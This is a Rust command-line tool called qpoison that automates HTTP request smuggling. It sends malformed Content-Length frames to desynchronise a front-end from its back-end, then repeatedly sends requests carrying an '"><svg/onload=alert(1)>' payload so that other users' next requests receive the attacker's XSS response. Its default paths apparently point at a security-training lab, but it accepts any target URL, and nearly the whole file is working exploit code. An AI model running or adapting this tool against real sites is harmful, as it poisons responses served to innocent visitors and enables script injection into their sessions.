#!/usr/bin/env rust-script
//! name: qpoison
//! description: 0.CL/CL.0 响应队列投毒驱动器 - 同一条前端连接上先发畸变原语(前端与后端对 Content-Length 的处置不一致时,body 字节在某一侧被当成新请求),造成前端"请求数 > 后端应答数"或反之的错位;再按模式持续灌入 XSS 请求,让受害者的下一次请求拿到攻击者构造的 XSS 响应。每轮记账响应状态、字节与载荷命中,probe 模式用第二条连接做串扰判读(第二条连接若无响应而第一条收到额外响应,即前端共享后端连接、错位成立)。
//! version: 1.0.0
//! args: <base-url> [--host H] [--mode probe|prime|deficit|surplus] [--prime-body S] [--xss-path /post?postId=1] [--ua PAYLOAD] [--duration-secs 60] [--interval-ms 700] [--read-ms 1200] [--out FILE] [--selftest]
//! keywords: smuggling, desync, 0cl, cl0, response-queue, poison, xss, hunter, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let ok = frame_body_len("POST / HTTP/1.1\r\nHost: H\r\n\r\n").is_ok()
            && contains_marker(b"xx <svg/onload=alert(1)> yy", "svg/onload");
        pi_rust_lib::report::success(
            "qpoison",
            json!({"selftest": if ok { "ok" } else { "fail" }}),
            "frame builder + marker check are the pure roots",
        )
        .unwrap_or(());
        return;
    }

    let mut base = String::new();
    let mut host_override: Option<String> = None;
    let mut mode = "probe".to_string();
    let mut prime_body: Option<String> = None;
    let mut xss_path = "/post?postId=1".to_string();
    let mut ua = "\"><svg/onload=alert(1)>".to_string();
    let mut duration_secs: u64 = 60;
    let mut interval_ms: u64 = 700;
    let mut read_ms: u64 = 1200;
    let mut out: Option<String> = None;
    let mut frames: Option<String> = None;
    let mut paths_arg: Option<String> = None;
    let mut wait_ms: u64 = 500;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--host" => {
                i += 1;
                host_override = args.get(i).cloned();
            }
            "--mode" => {
                i += 1;
                if let Some(m) = args.get(i) {
                    mode = m.clone();
                }
            }
            "--prime-body" => {
                i += 1;
                prime_body = args.get(i).map(|s| unescape(s));
            }
            "--xss-path" => {
                i += 1;
                if let Some(p) = args.get(i) {
                    xss_path = p.clone();
                }
            }
            "--ua" => {
                i += 1;
                ua = args.get(i).cloned().unwrap_or(ua);
            }
            "--duration-secs" => {
                i += 1;
                duration_secs = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(duration_secs);
            }
            "--interval-ms" => {
                i += 1;
                interval_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(interval_ms);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--out" => {
                i += 1;
                out = args.get(i).cloned();
            }
            "--frames" => {
                i += 1;
                frames = args.get(i).cloned();
            }
            "--paths" => {
                i += 1;
                paths_arg = args.get(i).cloned();
            }
            "--wait-ms" => {
                i += 1;
                wait_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(wait_ms);
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }

    if base.is_empty() {
        pi_rust_lib::report::failure(
            "qpoison",
            "usage",
            "call as: qpoison <base-url> --mode probe|prime|deficit|surplus [...]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = host_override.unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let tls = parsed.scheme() == "https";
    let port = parsed.port().unwrap_or(if tls { 443 } else { 80 });
    let marker = "svg/onload";

    let body_req = prime_body.unwrap_or_else(|| format!("GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"));
    let xss_req = format!(
        "GET {xss_path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
    );

    let deficit_frame = format!(
        "POST / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}",
        body_req.len(),
        body_req
    );
    let surplus_frame = format!(
        "POST / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}",
        xss_req.len(),
        xss_req
    );

    let mut log: Vec<Value> = Vec::new();
    let mut raw_all: Vec<u8> = Vec::new();
    let mut block_timing: Option<Value> = None;
    let result: Result<(), String> = (|| {
        let mut c1 = connect(&host, port, tls)?;
        match mode.as_str() {
            "probe" => {
                send(&mut c1, deficit_frame.as_bytes())?;
                let r1 = drain(&mut c1, 1000);
                raw_all.extend_from_slice(&r1);
                log.push(seg("conn1-after-prime", &r1, marker));
                // Second connection: if the front-end shares one back-end
                // connection, this request's response lands on conn1 instead.
                let mut c2 = connect(&host, port, tls)?;
                let start = Instant::now();
                send(&mut c2, format!("GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").as_bytes())?;
                let r2 = drain(&mut c2, 6000);
                raw_all.extend_from_slice(&r2);
                let mut row = seg("conn2-probe", &r2, marker);
                row["elapsed_ms"] = json!(start.elapsed().as_millis() as u64);
                log.push(row);
                let r3 = drain(&mut c1, 3000);
                raw_all.extend_from_slice(&r3);
                log.push(seg("conn1-after-conn2", &r3, marker));
            }
            "prime" => {
                send(&mut c1, deficit_frame.as_bytes())?;
                let r = drain(&mut c1, 8000);
                raw_all.extend_from_slice(&r);
                log.push(seg("prime", &r, marker));
            }
            "deficit" => {
                send(&mut c1, deficit_frame.as_bytes())?;
                let r = drain(&mut c1, 1000);
                raw_all.extend_from_slice(&r);
                log.push(seg("prime", &r, marker));
                let deadline = Instant::now() + Duration::from_secs(duration_secs);
                let mut round = 0u64;
                while Instant::now() < deadline {
                    timeout::check();
                    round += 1;
                    let frame = if round % 4 == 0 { deficit_frame.clone() } else { xss_req.clone() };
                    let kind = if round % 4 == 0 { "prime" } else { "xss" };
                    send(&mut c1, frame.as_bytes())?;
                    let r = drain(&mut c1, interval_ms);
                    raw_all.extend_from_slice(&r);
                    if !r.is_empty() {
                        log.push(seg(&format!("r{round}-{kind}"), &r, marker));
                    }
                    std::thread::sleep(Duration::from_millis(interval_ms.min(400)));
                }
            }
            "surplus" => {
                let deadline = Instant::now() + Duration::from_secs(duration_secs);
                let mut round = 0u64;
                while Instant::now() < deadline {
                    timeout::check();
                    round += 1;
                    send(&mut c1, surplus_frame.as_bytes())?;
                    let r = drain(&mut c1, interval_ms);
                    raw_all.extend_from_slice(&r);
                    if !r.is_empty() {
                        log.push(seg(&format!("r{round}-surplus"), &r, marker));
                    }
                    std::thread::sleep(Duration::from_millis(interval_ms.min(400)));
                }
            }
            "block" => {
                // Phase 1: baseline latency of a normal request.
                let t0 = Instant::now();
                let mut c1 = connect(&host, port, tls)?;
                send(&mut c1, format!("GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n").as_bytes())?;
                let (r1, fb1) = drain_timed(&mut c1, 4000);
                let base_ms = t0.elapsed().as_millis() as u64;
                raw_all.extend_from_slice(&r1);
                log.push(seg("baseline", &r1, marker));
                // Phase 2: second connection parks a CL-bearing request with a short body.
                let mut c2 = connect(&host, port, tls)?;
                send(&mut c2, format!("POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 100\r\n\r\nAAAAA").as_bytes())?;
                std::thread::sleep(Duration::from_millis(wait_ms));
                // Phase 3: does the first connection still get served promptly?
                let t1 = Instant::now();
                send(&mut c1, format!("GET /post?postId=999 HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").as_bytes())?;
                let (r2, fb2) = drain_timed(&mut c1, 12000);
                let second_ms = t1.elapsed().as_millis() as u64;
                raw_all.extend_from_slice(&r2);
                log.push(seg("second-after-blocker", &r2, marker));
                let (r3, fb3) = drain_timed(&mut c2, 4000);
                raw_all.extend_from_slice(&r3);
                log.push(seg("blocker-late", &r3, marker));
                block_timing = Some(json!({
                    "baseline_ms": base_ms,
                    "baseline_first_byte_ms": fb1,
                    "second_ms": second_ms,
                    "second_first_byte_ms": fb2,
                    "blocker_first_byte_ms": fb3,
                }));
            }
            "cl0probe" => {
                // A CL-bearing primer whose body IS a complete marker request; a
                // follow-up 404 request is appended. If the back-end ignores the
                // CL, response #2 is the marker page instead of the 404.
                let follow = format!("GET /post?postId=999 HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
                let list = paths_arg.unwrap_or_else(|| {
                    "GET /,GET /post?postId=1,GET /post?postId=5,GET /resources/labheader/css/academyLabHeader.css,GET /favicon.ico,GET /robots.txt,POST /,DELETE /foo,PUT /foo,OPTIONS /"
                        .to_string()
                });
                for spec in list.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                    let (method, path) = spec.split_once(' ').unwrap_or(("GET", spec));
                    let frame = format!(
                        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {}\r\n\r\n{}{}",
                        xss_req.len(),
                        xss_req,
                        follow
                    );
                    let mut c = connect(&host, port, tls)?;
                    send(&mut c, frame.as_bytes())?;
                    let r = drain(&mut c, 3000);
                    raw_all.extend_from_slice(&r);
                    log.push(seg(spec, &r, marker));
                }
            }
            "cltest" => {
                let path = frames.clone().ok_or("cltest needs --frames FILE (name|frame per line, \\r\\n escapes)")?;
                let text = std::fs::read_to_string(&path).map_err(|e| format!("read {path}: {e}"))?;
                for line in text.lines() {
                    let line = line.trim_end();
                    if line.trim().is_empty() || line.starts_with('#') {
                        continue;
                    }
                    let (name, raw) = line.split_once('|').unwrap_or((line, line));
                    let frame = unescape(raw).replace("{H}", &host);
                    let mut c = connect(&host, port, tls)?;
                    send(&mut c, frame.as_bytes())?;
                    let r = drain(&mut c, 3000);
                    raw_all.extend_from_slice(&r);
                    log.push(seg(name.trim(), &r, marker));
                }
            }
            other => return Err(format!("unknown mode {other}")),
        }
        Ok(())
    })();

    if let Err(e) = result {
        pi_rust_lib::report::failure("qpoison", &e, "check connectivity and the frame sizes");
        std::process::exit(1);
    }
    if let Some(p) = &out {
        let _ = std::fs::write(p, &raw_all);
    }
    let hits: usize = log.iter().filter(|r| r["marker_hit"] == json!(true)).count();
    pi_rust_lib::report::success(
        "qpoison",
        json!({
            "mode": mode,
            "host": host,
            "prime_body_len": body_req.len(),
            "xss_req_len": xss_req.len(),
            "segments": log,
            "timing": block_timing,
            "marker_hits": hits,
            "received_bytes": raw_all.len(),
            "raw_preview": String::from_utf8_lossy(&raw_all).chars().take(1500).collect::<String>(),
        }),
        "probe: empty conn2 + extra conn1 response proves the shared-queue desync; then run deficit/surplus for the victim window and read the banner",
    )
    .unwrap_or(());
}

fn connect(host: &str, port: u16, tls: bool) -> Result<Tls, String> {
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let server_name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let conn = rustls::ClientConnection::new(Arc::new(config), server_name).map_err(|e| format!("tls init: {e}"))?;
    let _ = tls;
    let mut stream = rustls::StreamOwned::new(conn, tcp);
    {
        // Handshake on the blocking socket (a receive timeout here makes rustls
        // surface EAGAIN mid-handshake); poll afterwards.
        let rustls::StreamOwned { conn, sock } = &mut stream;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    stream.sock.set_nonblocking(true).map_err(|e| format!("nonblocking: {e}"))?;
    Ok(stream)
}

fn send(stream: &mut Tls, bytes: &[u8]) -> Result<(), String> {
    let mut off = 0usize;
    let mut spins = 0u32;
    while off < bytes.len() {
        match stream.write(&bytes[off..]) {
            Ok(n) => off += n,
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                spins += 1;
                if spins > 2000 {
                    return Err("write blocked too long".to_string());
                }
                std::thread::sleep(Duration::from_millis(5));
            }
            Err(e) => return Err(format!("write: {e}")),
        }
    }
    let _ = stream.flush();
    Ok(())
}

fn drain_timed(stream: &mut Tls, window_ms: u64) -> (Vec<u8>, Option<u64>) {
    let mut buf: Vec<u8> = Vec::new();
    let mut tmp = [0u8; 16384];
    let start = Instant::now();
    let mut first: Option<u64> = None;
    let deadline = start + Duration::from_millis(window_ms);
    loop {
        match stream.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => {
                if first.is_none() {
                    first = Some(start.elapsed().as_millis() as u64);
                }
                buf.extend_from_slice(&tmp[..n]);
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(5));
            }
            Err(_) => break,
        }
        if Instant::now() >= deadline {
            break;
        }
    }
    (buf, first)
}

fn drain(stream: &mut Tls, window_ms: u64) -> Vec<u8> {
    let mut buf: Vec<u8> = Vec::new();
    let mut tmp = [0u8; 16384];
    let deadline = Instant::now() + Duration::from_millis(window_ms);
    loop {
        match stream.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => buf.extend_from_slice(&tmp[..n]),
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(5));
            }
            Err(_) => break,
        }
        if Instant::now() >= deadline {
            break;
        }
    }
    buf
}

fn contains_marker(bytes: &[u8], marker: &str) -> bool {
    String::from_utf8_lossy(bytes).contains(marker)
}

fn frame_body_len(frame: &str) -> Result<usize, String> {
    if !frame.contains("\r\n\r\n") {
        return Err("frame has no header terminator".to_string());
    }
    Ok(frame.len())
}

fn seg(label: &str, bytes: &[u8], marker: &str) -> Value {
    let text = String::from_utf8_lossy(bytes).to_string();
    let parts = split_responses(bytes);
    let statuses: Vec<Value> = parts
        .iter()
        .map(|p| {
            let t = String::from_utf8_lossy(p);
            let line = t.lines().next().unwrap_or("").trim().to_string();
            let status = line.split_whitespace().nth(1).and_then(|s| s.parse::<u16>().ok());
            let body_len = t.split_once("\r\n\r\n").map(|(_, b)| b.len()).unwrap_or(0);
            json!({"status": status, "status_line": line, "body_len": body_len})
        })
        .collect();
    json!({
        "label": label,
        "bytes": bytes.len(),
        "responses": statuses,
        "response_count": parts.len(),
        "marker_hit": text.contains(marker),
        "preview": text.chars().take(400).collect::<String>(),
    })
}

fn split_responses(bytes: &[u8]) -> Vec<&[u8]> {
    let mut starts: Vec<usize> = Vec::new();
    let mut from = 0usize;
    while let Some(rel) = find(&bytes[from..], b"HTTP/1.") {
        let pos = from + rel;
        if pos == 0 || (pos >= 2 && &bytes[pos - 2..pos] == b"\r\n") || (pos >= 1 && bytes[pos - 1] == b'\n') {
            starts.push(pos);
        }
        from = pos + 7;
    }
    if starts.is_empty() {
        return vec![bytes];
    }
    if starts[0] != 0 {
        starts.insert(0, 0);
    }
    let mut out = Vec::new();
    for (i, &s) in starts.iter().enumerate() {
        let end = starts.get(i + 1).copied().unwrap_or(bytes.len());
        out.push(&bytes[s..end]);
    }
    out
}

fn find(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('r') => out.push('\r'),
                Some('n') => out.push('\n'),
                Some('t') => out.push('\t'),
                Some('\\') => out.push('\\'),
                Some(other) => {
                    out.push('\\');
                    out.push(other);
                }
                None => out.push('\\'),
            }
        } else {
            out.push(c);
        }
    }
    out
}
